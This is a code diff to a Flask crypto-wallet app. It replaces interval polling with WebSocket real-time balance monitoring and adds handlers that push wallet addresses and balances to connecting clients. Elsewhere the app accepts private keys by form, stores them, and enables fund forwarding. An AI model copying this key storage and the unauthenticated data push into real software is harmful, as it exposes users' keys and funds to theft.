@@ -1,5 +1,6 @@
 from flask import render_template, request, flash, redirect, url_for, jsonify
-from app import app, db
+from flask_socketio import emit, join_room, leave_room
+from app import app, db, socketio
 from models import WalletConfig, BalanceHistory, TelegramConfig, TransactionLog
 from web3 import Web3
 from eth_account import Account
@@ -33,7 +34,7 @@ def setup_wallet():
     try:
         private_key = request.form.get('private_key', '').strip()
         threshold = request.form.get('threshold', '0.01')
-        check_interval = int(request.form.get('check_interval', 300))
+        # check_interval removed - using real-time monitoring now
         
         if not private_key:
             # Try to get from environment
@@ -71,7 +72,7 @@ def setup_wallet():
         if existing_wallet:
             existing_wallet.is_active = True
             existing_wallet.threshold_alert = threshold
-            existing_wallet.check_interval = check_interval
+            # check_interval removed - using real-time monitoring
             existing_wallet.private_key = private_key_formatted
             existing_wallet.forwarding_enabled = True
             flash(f'Wallet {address} updated successfully with forwarding enabled!', 'success')
@@ -81,7 +82,7 @@ def setup_wallet():
             wallet_config.address = address
             wallet_config.private_key = private_key_formatted
             wallet_config.threshold_alert = threshold
-            wallet_config.check_interval = check_interval
+            # check_interval removed - using real-time monitoring
             wallet_config.is_active = True
             wallet_config.forwarding_enabled = True
             db.session.add(wallet_config)
@@ -261,3 +262,56 @@ def configure_forwarding():
         flash(f'Error configuring forwarding: {str(e)}', 'error')
     
     return redirect(url_for('index'))
+
+# WebSocket event handlers
+@socketio.on('connect')
+def handle_connect():
+    logging.info('Client connected to WebSocket')
+    
+    # Send current wallet status
+    try:
+        wallets = WalletConfig.query.filter_by(is_active=True).all()
+        wallet_data = []
+        
+        for wallet in wallets:
+            # Get current balance
+            try:
+                etherscan = EtherscanAPI()
+                current_balance = etherscan.get_balance(wallet.address)
+                current_balance_eth = float(Web3.from_wei(int(current_balance) if current_balance else 0, 'ether'))
+            except:
+                current_balance_eth = 0
+                
+            wallet_data.append({
+                'address': wallet.address,
+                'balance': current_balance_eth,
+                'threshold': wallet.threshold_alert,
+                'is_active': wallet.is_active
+            })
+        
+        emit('wallet_status', wallet_data)
+        
+    except Exception as e:
+        logging.error(f"Error sending initial wallet status: {str(e)}")
+
+@socketio.on('disconnect')
+def handle_disconnect():
+    logging.info('Client disconnected from WebSocket')
+
+@socketio.on('start_monitoring')
+def handle_start_monitoring():
+    """Start real-time monitoring for all active wallets"""
+    from wallet_monitor_realtime import start_realtime_monitoring
+    
+    logging.info('Starting real-time wallet monitoring via WebSocket')
+    start_realtime_monitoring(socketio)
+    emit('monitoring_status', {'status': 'started', 'message': 'Real-time monitoring active'})
+
+@socketio.on('stop_monitoring')
+def handle_stop_monitoring():
+    """Stop real-time monitoring"""
+    from wallet_monitor_realtime import stop_realtime_monitoring
+    
+    logging.info('Stopping real-time wallet monitoring')
+    stop_realtime_monitoring()
+    emit('monitoring_status', {'status': 'stopped', 'message': 'Real-time monitoring stopped'})
